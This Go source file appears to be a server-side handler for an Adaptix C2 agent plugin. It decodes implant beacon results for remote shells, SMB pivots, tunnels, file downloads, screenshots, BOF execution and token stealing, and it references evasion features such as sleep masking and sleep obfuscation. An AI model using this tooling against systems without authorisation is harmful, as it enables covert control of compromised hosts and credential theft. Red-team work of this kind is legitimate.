package main

import (
	"encoding/binary"
	"fmt"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
	"nonameax/naxwire"
)

func naxProcessData(agentData adaptix.AgentData, decryptedData []byte) error {

	beaconID := string(agentData.UID)
	if beaconID != "" {
		agentIdToBeaconId.Store(agentData.Id, beaconID)
	}

	msgType, _, body, err := naxwire.DecodeFrame(decryptedData)
	if err != nil {
		naxLogErr("ProcessData: DecodeFrame error: %v", err)
		return err
	}
	switch msgType {
	case naxwire.WireTypeHeartbeat, naxwire.WireTypeRegister:
		return nil

	case naxwire.WireTypeResult:
		taskId, status, data, parseErr := naxwire.DecodeResultBody(body)
		if parseErr != nil {
			naxLogErr("ProcessData: DecodeResultBody error: %v", parseErr)
			return parseErr
		}
		taskIdInt := int64(taskId)

		displayText := string(data)
		clearText := ""

		if _, isShell := activeShells.Load(taskIdInt); isShell {
			switch status {
			case JOB_OUTPUT:
				if len(data) == 0 {
					if Ts != nil {
						Ts.TsTerminalConnResume(agentData.Id, taskIdInt, false)
					}
				} else {
					if Ts != nil {
						output := Ts.TsConvertCpToUTF8(string(data), agentData.OemCP)
						Ts.TsTerminalConnData(taskIdInt, []byte(output))
					}
				}
			case JOB_COMPLETE:
				activeShells.Delete(taskIdInt)
				if Ts != nil {
					reason := "Process exited"
					if len(data) >= 4 {
						code := binary.LittleEndian.Uint32(data[0:4])
						if code != 0 {
							reason = fmt.Sprintf("Process exited with code %d", code)
						}
					}
					_ = Ts.TsTerminalConnClose(taskIdInt, reason)
				}
			case JOB_KILLED:
				activeShells.Delete(taskIdInt)
				if Ts != nil {
					_ = Ts.TsTerminalConnClose(taskIdInt, "Terminal stopped")
				}
			}
			return nil
		}

		if _, isJob := activeJobs.Load(taskIdInt); isJob {
			resultJobOutput(agentData, taskIdInt, status, data)
			return nil
		}

		if taskId == 0 && status == STATUS_TUNNEL && len(data) > 0 {
			processTunnelResult(agentData.Id, data)
			return nil
		}

		if taskId == 0 && len(data) >= 2 {
			pivType := data[0]
			switch pivType {
			case 0:
				if len(data) < 9 {
					return nil
				}
				pivotId := fmt.Sprintf("%08x", binary.LittleEndian.Uint32(data[1:5]))
				pivotDataLen := binary.LittleEndian.Uint32(data[5:9])
				if int(pivotDataLen) <= len(data)-9 {
					pivotData := data[9 : 9+pivotDataLen]
					if Ts != nil {
						_, _, childAgentId := Ts.TsGetPivotInfoById(pivotId)
						_ = Ts.TsAgentProcessData(childAgentId, pivotData)
						_ = Ts.TsAgentSetTick(childAgentId, "")
						clearChildMark(childAgentId)
					}
				}
			case 1:
				if len(data) < 6 {
					return nil
				}
				pivotId := fmt.Sprintf("%08x", binary.LittleEndian.Uint32(data[1:5]))
				pivotDisType := data[5]
				if Ts != nil && pivotDisType != 0 {
					_, parentAgentId, childAgentId := Ts.TsGetPivotInfoById(pivotId)
					_ = Ts.TsPivotDelete(pivotId)
					deletePivotFromStore(pivotId)
					msgParent := fmt.Sprintf("SMB agent disconnected %d", childAgentId)
					msgChild := fmt.Sprintf(" ----- SMB agent disconnected from [%d] ----- ", parentAgentId)
					Ts.TsAgentConsoleOutput(agentData.Id, "", messageSeveritySuccess, msgParent, "\n", true)
					Ts.TsAgentConsoleOutput(childAgentId, "", messageSeveritySuccess, msgChild, "\n", true)
				}
			}
			return nil
		}

		if cmdIdRaw, ok := pendingCmdIds.LoadAndDelete(taskIdInt); ok {
			cmdId := cmdIdRaw.(byte)
			switch {
			case status == STATUS_OK && cmdId == CMD_SLEEP && len(data) >= 5:
				displayText, clearText = resultSleep(agentData, data)

			case status == STATUS_OK && cmdId == CMD_LS:
				if len(data) > 1 && data[0] == 0xFF {
					displayText = "Directory tree"
					clearText = string(data[1:])
				} else {
					displayText, clearText = decodeLsResult(data)
				}

			case status == STATUS_OK && cmdId == CMD_PS_LIST:
				displayText, clearText = decodePsListResult(agentData, taskIdInt, data)

			case status == STATUS_OK && cmdId == CMD_PS_KILL && len(data) >= 4:
				displayText, clearText = resultPsKill(data)

			case status == STATUS_OK && cmdId == CMD_PS_RUN && len(data) >= 5:
				displayText, clearText = resultPsRun(data)

			case status == STATUS_OK && cmdId == CMD_UPLOAD:
				displayText = "File successfully uploaded"

			case status == STATUS_OK && cmdId == CMD_CHUNKSIZE && len(data) >= 4:
				displayText, clearText = resultChunksize(data)

			case status == STATUS_OK && cmdId == CMD_CD:
				displayText = "Working directory changed"

			case status == STATUS_OK && cmdId == CMD_PWD:
				displayText = string(data)

			case status == STATUS_OK && cmdId == CMD_MKDIR:
				displayText = "Directory created"

			case status == STATUS_OK && cmdId == CMD_RMDIR:
				displayText = "Directory removed"

			case status == STATUS_OK && cmdId == CMD_CAT:
				displayText = "File contents"
				clearText = string(data)

			case status == STATUS_OK && cmdId == CMD_RM:
				displayText = "File deleted"

			case status == STATUS_OK && cmdId == CMD_CP:
				displayText = "File copied"

			case status == STATUS_OK && cmdId == CMD_MV:
				displayText = "File moved"

			case status == STATUS_OK && cmdId == CMD_BOF_STOMP:
				displayText = string(data)

			case status == STATUS_OK && cmdId == CMD_SLEEPMASK_SET:
				displayText = "Sleepmask installed"

			case status == STATUS_OK && cmdId == CMD_DLL_NOTIFY_LIST:
				displayText = "DLL notifications"
				clearText = string(data)

			case status == STATUS_OK && cmdId == CMD_DLL_NOTIFY_REMOVE:
				displayText = string(data)

			case cmdId == CMD_PROFILE:
				displayText, clearText = resultProfile(agentData, status)

			case status == STATUS_OK && cmdId == CMD_TOKEN_GETUID:
				displayText, clearText = resultTokenGetuid(data)

			case status == STATUS_OK && cmdId == CMD_TOKEN_STEAL:
				displayText, clearText = resultTokenSteal(agentData, data)

			case status == STATUS_OK && cmdId == CMD_TOKEN_USE:
				displayText, clearText = resultTokenUse(agentData, data)

			case status == STATUS_OK && cmdId == CMD_TOKEN_LIST:
				displayText, clearText = decodeTokenListResult(data)

			case status == STATUS_OK && cmdId == CMD_TOKEN_RM:
				displayText = "Token removed"

			case status == STATUS_OK && cmdId == CMD_TOKEN_REVERT:
				displayText, clearText = resultTokenRevert(agentData)

			case status == STATUS_OK && cmdId == CMD_TOKEN_MAKE:
				displayText, clearText = resultTokenMake(agentData, data)

			case status == STATUS_OK && cmdId == CMD_TOKEN_PRIVS:
				displayText, clearText = decodeTokenPrivsResult(data)

			case status == STATUS_ERR && (cmdId == CMD_TOKEN_GETUID || cmdId == CMD_TOKEN_STEAL || cmdId == CMD_TOKEN_USE || cmdId == CMD_TOKEN_LIST || cmdId == CMD_TOKEN_RM || cmdId == CMD_TOKEN_REVERT || cmdId == CMD_TOKEN_MAKE || cmdId == CMD_TOKEN_PRIVS):
				displayText = resultTokenErr(data)

			case cmdId == CMD_LINK && status == STATUS_OK && len(data) >= 5:
				displayText = resultLink(agentData, taskId, data)

			case cmdId == CMD_UNLINK && len(data) >= 5:
				displayText = resultUnlink(agentData, data)

			case cmdId == CMD_PIVOT_EXEC && len(data) >= 8:
				pivotId := fmt.Sprintf("%08x", binary.LittleEndian.Uint32(data[0:4]))
				pivotDataLen := binary.LittleEndian.Uint32(data[4:8])
				if int(pivotDataLen) <= len(data)-8 {
					pivotData := data[8 : 8+pivotDataLen]
					if Ts != nil {
						_, _, childAgentId := Ts.TsGetPivotInfoById(pivotId)
						_ = Ts.TsAgentProcessData(childAgentId, pivotData)
						_ = Ts.TsAgentSetTick(childAgentId, "")
						clearChildMark(childAgentId)
					}
				}
				return nil

			case cmdId == CMD_BOF && status == STATUS_ASYNC:
				resultBofAsync(agentData, taskIdInt)
				return nil

			case cmdId == CMD_DOWNLOAD && status == STATUS_OK && len(data) > 0:
				dlDisplay, dlCompleted, dlSkip := handleChunkedDownload(Ts, agentData.Id, taskIdInt, data)
				if dlSkip {
					return nil
				}
				displayText = dlDisplay
				if !dlCompleted {
					task := adaptix.TaskData{
						Type:        taskTypeTask,
						AgentId:     agentData.Id,
						TaskId:      taskIdInt,
						Completed:   false,
						Sync:        true,
						MessageType: messageSeverityInfo,
						Message:     displayText,
					}
					if Ts != nil {
						Ts.TsTaskUpdate(agentData.Id, task)
					}
					return nil
				}

			case cmdId == CMD_SAVEMEMORY:
				return nil

			case cmdId == CMD_BOF || cmdId == CMD_SCREENSHOT:
				displayText, clearText = resultBofSync(agentData, status, cmdId, data)

			case cmdId == CMD_JOB_LIST && status == STATUS_OK && len(data) >= 4:
				displayText, clearText = resultJobList(data)

			case cmdId == CMD_JOB_KILL:
				if status == STATUS_OK {
					displayText = "Job kill signal sent"
				} else {
					displayText = "Job not found"
				}

			case cmdId == CMD_WATCHDOG_SET:
				displayText, clearText = resultWatchdog(status, data)

			case cmdId == CMD_SLEEPOBF_CONFIG:
				displayText, clearText = resultSleepobfConfig(status, data)
			}
		} else if _, isDl := activeDownloads.Load(taskIdInt); isDl && status == STATUS_OK && len(data) > 0 {
			dlDisplay, dlCompleted, dlSkip := handleChunkedDownload(Ts, agentData.Id, taskIdInt, data)
			if dlSkip {
				return nil
			}
			displayText = dlDisplay
			if !dlCompleted {
				task := adaptix.TaskData{
					Type:        taskTypeTask,
					AgentId:     agentData.Id,
					TaskId:      taskIdInt,
					Completed:   false,
					Sync:        true,
					MessageType: messageSeverityInfo,
					Message:     displayText,
				}
				if Ts != nil {
					Ts.TsTaskUpdate(agentData.Id, task)
				}
				return nil
			}
		}

		task := adaptix.TaskData{
			Type:       taskTypeTask,
			AgentId:    agentData.Id,
			TaskId:     taskIdInt,
			FinishDate: time.Now().Unix(),
			Completed:  true,
			Sync:       true,
		}
		if status == STATUS_OK {
			task.MessageType = messageSeveritySuccess
			task.Message = displayText
			if clearText != "" {
				task.ClearText = clearText
			}
		} else {
			errMsg := fmt.Sprintf("command failed (status=%d)", status)
			if len(data) >= 4 {
				code := binary.LittleEndian.Uint32(data)
				if code != 0 {
					if Ts != nil {
						errMsg = fmt.Sprintf("Error [%d]: %s", code, Ts.TsWin32Error(uint(code)))
					} else {
						errMsg = fmt.Sprintf("command failed: Win32 error %d (%s)", code, win32ErrorName(code))
					}
				}
			}
			task.MessageType = messageSeverityError
			task.Message = errMsg
		}
		if Ts != nil {
			Ts.TsTaskUpdate(agentData.Id, task)
		}
		return nil

	default:
		return fmt.Errorf("nonameax: ProcessData: unknown wire type %d", msgType)
	}
}
